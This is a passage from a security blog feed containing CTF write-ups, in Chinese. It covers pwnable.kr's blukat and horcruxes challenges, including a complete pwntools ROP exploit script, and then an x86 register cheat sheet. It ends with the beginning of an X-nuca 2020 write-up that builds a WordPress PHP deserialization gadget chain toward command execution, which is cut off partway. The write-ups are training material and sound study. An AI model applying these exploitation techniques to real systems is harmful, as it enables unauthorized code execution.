class="line">calc_flag(password);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong guess!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一道很迷惑的题，乍一看buf处可以溢出28个字节，但是这个题和溢出没有任何关系。最后的目的是我们需要输入一个password，相等的话就给flag，不然就exit，和溢出相关的就只有fgets以后到strcmp之前这段，这之后的代码我们完全不可控制，首先我们不可能知道password，所以不会进calc_flag的分支，但是进另一个分支就直接exit了，连main的return都没执行，所以这个题和溢出没有任何关系。</p><p>所以我们就得想办法拿到password，想办法从程序里弄已经是不可能了，就只能考虑其他办法，直接cat，返回<code>cat: password: Permission denied</code>，但是我们再head一下，发现还是返回的<code>cat: password: Permission denied</code>，所以，这句话就是password的内容，并且我们是可读的，看一下password的权限，是<code>-rw-r-----</code>，并且属于blukat_pwn组，而正好我们也是blukat_pwn，所以password本身就是可读的，问题就简单很多了，直接<code>cat password | ./blukat</code>即可。</p><p>其实仔细想想，这题才3分，前一个unlink都10分，所以这题肯定不会太复杂。</p><h1 id="horcruxes-7-pt"><a href="#horcruxes-7-pt" class="headerlink" title="horcruxes (7 pt)"></a>horcruxes (7 pt)</h1><p>这次没有给源码了，直接给了二进制程序，IDA分析一下，上来就看见个seccomp，所以还是个沙箱题。题目给了个hint，说伏地魔把分裂的灵魂藏在了7个魂器里，正好题目里有ABCDEFG一共7个函数，先看一下最开始的init_ABCDEFG。首先从urandom里读了4个字节到buf里，然后用buf[0]作为随机数的种子，之后random出来7个数，求和放入sum里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">init_ABCDEFG</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(fd, buf, <span class="number">4u</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/dev/urandom error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  srand(*buf);</span><br><span class="line">  a = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  b = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  c = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  d = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  e = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  f = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  v0 = rand();</span><br><span class="line">  g = <span class="number">0xDEADBEEF</span> * v0 % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  result = f + e + d + c + b + a + <span class="number">0xDEADBEEF</span> * v0 % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  sum = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数在rop_me里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ropme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+4h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+68h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Select Menu:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == a )</span><br><span class="line">  &#123;</span><br><span class="line">    A();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == b )</span><br><span class="line">  &#123;</span><br><span class="line">    B();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == c )</span><br><span class="line">  &#123;</span><br><span class="line">    C();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == d )</span><br><span class="line">  &#123;</span><br><span class="line">    D();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == e )</span><br><span class="line">  &#123;</span><br><span class="line">    E();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == f )</span><br><span class="line">  &#123;</span><br><span class="line">    F();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == g )</span><br><span class="line">  &#123;</span><br><span class="line">    G();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How many EXP did you earned? : &quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">if</span> ( atoi(s) == sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      s[read(fd, s, <span class="number">0x64</span>u)] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(s);</span><br><span class="line">      close(fd);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;d better get more experience to kill Voldemort&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的a到f就是刚才的随机数，很明显我们不会知道那些随机数是什么，所以就进入了最后一个分支，这里有一个gets，很明显的一个栈溢出，并且如果我们输入的字符串刚好就是sum的话就给我们flag，所以这个题我们不一定需要getshell，目的就是想办法泄漏出sum。</p><p>没有开启canary，所以这个栈溢出可以让我们任意地址跳转，首先我们肯定想直接调转到open那里，但是这里用的是gets获取的字符串，而open flag那里的地址为0x080A010E，其中包含了0x0a，而gets读取的时候遇到0x0a的时候就会停下，所以我们只能跳转到不包含0x0a的地址。再往前看，发现A，B，C那几个函数刚好在0x0a地址的前面，例如A的地址为<em>0x</em>0809FE4B，而调用A的时候刚好可以泄漏出a的值，这样从A到G依次调用一遍，我们就可以知道a到g的值，然后就能计算出sum，最后再跳转到ropme执行一遍验证输入sum就可以拿到flag，刚好main函数里call ropme的地址为<em>0x</em>0809FFFC，也不包含0x0a，所以就可以形成一个rop链。</p><p>最终的exp如下。需要注意的是只有当sum是个负数的时候才能成功，具体原因还不清楚，debug的时候发现若sum是个正数，atoi的时候会失败，只有负数才会成功，所以需要多尝试几次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> compile <span class="keyword">as</span> re_compile</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9032</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear(arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./horcruxes&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line">A = <span class="number">0x0809FE4B</span></span><br><span class="line">B = <span class="number">0x0809FE6A</span></span><br><span class="line">C = <span class="number">0x0809FE89</span></span><br><span class="line">D = <span class="number">0x0809FEA8</span></span><br><span class="line">E = <span class="number">0x0809FEC7</span></span><br><span class="line">F = <span class="number">0x0809FEE6</span></span><br><span class="line">G = <span class="number">0x0809FF05</span></span><br><span class="line">ropme = <span class="number">0x0809FFFC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Select Menu:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;How many EXP did you earned? : &#x27;</span>, pg.get(<span class="number">116</span>) + p32(<span class="number">4</span>) + p32(A) + p32(B) + p32(C) + p32(D) + p32(E) + p32(F) + p32(G) + p32(ropme))</span><br><span class="line">conn.recvline()</span><br><span class="line"></span><br><span class="line">findall = re_compile(<span class="string">r&#x27;\(EXP \+(-?\d+)\)&#x27;</span>).findall</span><br><span class="line"></span><br><span class="line">a = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get a: %d&#x27;</span> % a)</span><br><span class="line">b = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get b: %d&#x27;</span> % b)</span><br><span class="line">c = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get c: %d&#x27;</span> % c)</span><br><span class="line">d = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get d: %d&#x27;</span> % d)</span><br><span class="line">e = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get e: %d&#x27;</span> % e)</span><br><span class="line">f = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get f: %d&#x27;</span> % f)</span><br><span class="line">g = int(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get g: %d&#x27;</span> % g)</span><br><span class="line"></span><br><span class="line">s = str(a+b+c+d+e+f+g)</span><br><span class="line">log.info(<span class="string">&#x27;Sum: &#x27;</span> + s)</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Select Menu:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;How many EXP did you earned? : &#x27;</span>, s)</span><br><span class="line">log.success(<span class="string">&#x27;Got flag: &#x27;</span> + conn.recvline())</span><br><span class="line"></span><br><span class="line"><span class="comment"># conn.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Pwnable at korea writeups of section &quot;Toddler&#39;s Bottle&quot;. Including &quot;fd&quot;, &quot;collision&quot;, &quot;bof&quot;, &quot;flag&quot;, &quot;passcode&quot;, &quot;random&quot;, &quot;input&quot;, &quot;leg&quot;, &quot;mistake&quot;, &quot;shellshock&quot;, &quot;conin1&quot;, &quot;blackjack&quot;, &quot;lotto&quot;, &quot;cmd1&quot;, &quot;cmd2&quot;, &quot;uaf&quot;, &quot;memcpy&quot;, &quot;asm&quot;, &quot;unlink&quot;, &quot;blukat&quot;, &quot;horcruxes&quot;.</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Register CheatSheet</title>
    <link href="https://srpopty.github.io/2021/08/10/Register-CheatSheet/"/>
    <id>https://srpopty.github.io/2021/08/10/Register-CheatSheet/</id>
    <published>2021-08-10T11:07:22.000Z</published>
    <updated>2021-08-10T11:24:19.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-x86-32bit"><a href="#0x0-x86-32bit" class="headerlink" title="0x0 x86-32bit"></a>0x0 x86-32bit</h1><table><thead><tr><th align="center">Register</th><th align="center">Lower 16 bits</th><th align="center">High 8 bits of lower 16 bits</th><th align="center">Low 8 bits of lower 16 bits</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">eax</td><td align="center">ax</td><td align="center">ah</td><td align="center">al</td><td align="center">accumulator</td></tr><tr><td align="center">ebx</td><td align="center">bx</td><td align="center">bh</td><td align="center">bl</td><td align="center">base register</td></tr><tr><td align="center">ecx</td><td align="center">cx</td><td align="center">ch</td><td align="center">cl</td><td align="center">counter register</td></tr><tr><td align="center">edx</td><td align="center">dx</td><td align="center">dh</td><td align="center">dl</td><td align="center">data register - can be used for I/O port access and arithmetic functions</td></tr><tr><td align="center">esi</td><td align="center">si</td><td align="center"></td><td align="center"></td><td align="center">source index register</td></tr><tr><td align="center">edi</td><td align="center">di</td><td align="center"></td><td align="center"></td><td align="center">destination index register</td></tr><tr><td align="center">ebp</td><td align="center">bp</td><td align="center"></td><td align="center"></td><td align="center">base pointer register</td></tr><tr><td align="center">esp</td><td align="center">sp</td><td align="center"></td><td align="center"></td><td align="center">Stack pointer</td></tr><tr><td align="center">eip</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">instruction pointer</td></tr><tr><td align="center">flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">flags</td></tr></tbody></table><h1 id="0x1-x86-64bit"><a href="#0x1-x86-64bit" class="headerlink" title="0x1 x86-64bit"></a>0x1 x86-64bit</h1><table><thead><tr><th align="center">Register</th><th align="center">Lower 32 bits</th><th align="center">Lower 16 bits</th><th align="center">High 8 bits of lower 16 bits</th><th align="center">Low 8 bits of lower 16 bits</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">rax</td><td align="center">eax</td><td align="center">ax</td><td align="center">ah</td><td align="center">al</td><td align="center">accumulator</td></tr><tr><td align="center">rbx</td><td align="center">ebx</td><td align="center">bx</td><td align="center">bh</td><td align="center">bl</td><td align="center">base register</td></tr><tr><td align="center">rcx</td><td align="center">ecx</td><td align="center">cx</td><td align="center">ch</td><td align="center">cl</td><td align="center">counter register</td></tr><tr><td align="center">rdx</td><td align="center">edx</td><td align="center">dx</td><td align="center">dh</td><td align="center">dl</td><td align="center">data register - can be used for I/O port access and arithmetic functions</td></tr><tr><td align="center">rsi</td><td align="center">esi</td><td align="center">si</td><td align="center"></td><td align="center">sil</td><td align="center">source index register</td></tr><tr><td align="center">rdi</td><td align="center">edi</td><td align="center">di</td><td align="center"></td><td align="center">dil</td><td align="center">destination index register</td></tr><tr><td align="center">rbp</td><td align="center">ebp</td><td align="center">bp</td><td align="center"></td><td align="center">bpl</td><td align="center">base pointer register</td></tr><tr><td align="center">rsp</td><td align="center">esp</td><td align="center">sp</td><td align="center"></td><td align="center">spl</td><td align="center">Stack pointer</td></tr><tr><td align="center">r8</td><td align="center">r8d</td><td align="center">r8w</td><td align="center"></td><td align="center">r8b</td><td align="center"></td></tr><tr><td align="center">r9</td><td align="center">r9d</td><td align="center">r9w</td><td align="center"></td><td align="center">r9b</td><td align="center"></td></tr><tr><td align="center">r10</td><td align="center">r10d</td><td align="center">r10w</td><td align="center"></td><td align="center">r10b</td><td align="center"></td></tr><tr><td align="center">r11</td><td align="center">r11d</td><td align="center">r11w</td><td align="center"></td><td align="center">r11b</td><td align="center"></td></tr><tr><td align="center">r12</td><td align="center">r12d</td><td align="center">r12w</td><td align="center"></td><td align="center">r12b</td><td align="center"></td></tr><tr><td align="center">r13</td><td align="center">r13d</td><td align="center">r13w</td><td align="center"></td><td align="center">r13b</td><td align="center"></td></tr><tr><td align="center">r14</td><td align="center">r14d</td><td align="center">r14w</td><td align="center"></td><td align="center">r14b</td><td align="center"></td></tr><tr><td align="center">r15</td><td align="center">R15d</td><td align="center">r15w</td><td align="center"></td><td align="center">r15b</td><td align="center"></td></tr><tr><td align="center">rip</td><td align="center"></td><td align="center">0x09</td><td align="center"></td><td align="center"></td><td align="center">instruction pointer</td></tr><tr><td align="center">rflags</td><td align="center"></td><td align="center">0x0a</td><td align="center"></td><td align="center"></td><td align="center">flags</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">Common registers cheat sheets.</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>X-nuca 2020 ezwp Writeup</title>
    <link href="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/"/>
    <id>https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/</id>
    <published>2020-12-10T06:26:15.000Z</published>
    <updated>2020-12-13T04:09:17.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-WordPress"><a href="#0x0-WordPress" class="headerlink" title="0x0 WordPress"></a>0x0 WordPress</h1><p>题目直接给了一个WordPress的整站，题目附件除了源码还很贴心的给了数据库，在本地搭建好环境以后就可以调试了。先是用wpscan扫描一下，发现除了Contact-Form-7插件，整个站包括wordpress都是最新版，从数据库中可以看到有一个admin的管理员用户，但是并没有给出admin的密码，一般来说题目是不会让你去爆破管理员密码的，所以题目肯定是需要注册一个低等级账号进行提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Dumping data for table &#96;wp_users&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;wp_users&#96; WRITE;</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;wp_users&#96; DISABLE KEYS *&#x2F;;</span><br><span class="line">INSERT INTO &#96;wp_users&#96; VALUES (1,&#39;admin&#39;,&#39;&#39;,&#39;admin&#39;,&#39;admin@qq.com&#39;,&#39;http:&#x2F;&#x2F;192.168.248.151&#39;,&#39;2020-12-05 09:10:11&#39;,&#39;&#39;,0,&#39;admin&#39;);</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;wp_users&#96; ENABLE KEYS *&#x2F;;</span><br><span class="line">UNLOCK TABLES;</span><br></pre></td></tr></table></figure><p>再看过期的Contact-Foem-7插件，它的版本是5.0.3，而最新版已经是5.3.1，5.0.3版本是存在漏洞的，所以题目的预期解应该是需要利用该插件去提权，但是在比赛中并没有完全利用成功，而是使用了另一种非预期解反序列化执行命令拿到了flag，关于Contact-Foem-7插件的利用，将在0x6节中详细分析。</p><h1 id="0x1-Unserialize-POP-Chain"><a href="#0x1-Unserialize-POP-Chain" class="headerlink" title="0x1 Unserialize POP Chain"></a>0x1 Unserialize POP Chain</h1><p>题目最终的目的是执行命令，运行根目录下的readflag程序获取flag，所以首先就需要找到一个可以执行任意命令或者代码的地方。在文件FilteredIterator.php中有一个Requests_Utility_FilteredIterator类，该类继承自数组迭代器，在current方法中会执行<code>call_user_func($this-&gt;callback, $value);</code>，这看起来是一个非常漂亮的执行php代码的地方，只要可以控制该类的data与callback成员变量，就可以执行任意数量参数的php函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/Requests/Utility/FilteredIterator.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Callback to run as a filter</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> callable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $callback;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a new iterator</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $data</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> callable $callback Callback to be called on each value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $callback</span>) </span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::__construct($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the current item&#x27;s value after filtering</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$value = <span class="built_in">parent</span>::current();</span><br><span class="line">$value = call_user_func(<span class="keyword">$this</span>-&gt;callback, $value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在php中迭代器主要在foreach中使用（例如php的原生数组Array类），当一个迭代器在foreach中开始迭代的时候，每次迭代都将会调用current函数以返回一个迭代器中存储的对象，所以只需要对Requests_Utility_FilteredIterator类进行迭代就可以自动触发call_user_func。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>=&gt;<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以下一步就是需要找到一个魔术方法，该魔术方法中会对自身的某一个成员变量进行foreach迭代。对于魔术方法的寻找，很多人可能喜欢去寻找__wakeup或者__toString，但是其实最佳的目标就是构造函数__construct和析构函数__destruct，这两个函数会经常在各种类中出现，而且触发方式非常简单，经过长时间的寻找，很幸运，在插件all-in-one-event-calendar中就存在Ai1ec_Shutdown_Controller类的析构函数，该析构函数中会对$this-&gt;_preserve遍历进行迭代。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-content/plugins/all-in-one-event-calendar/app/controller/shutdown.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// replace globals from our internal store</span></span><br><span class="line">            $restore = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> ( <span class="keyword">$this</span>-&gt;_preserve <span class="keyword">as</span> $name =&gt; $class ) &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        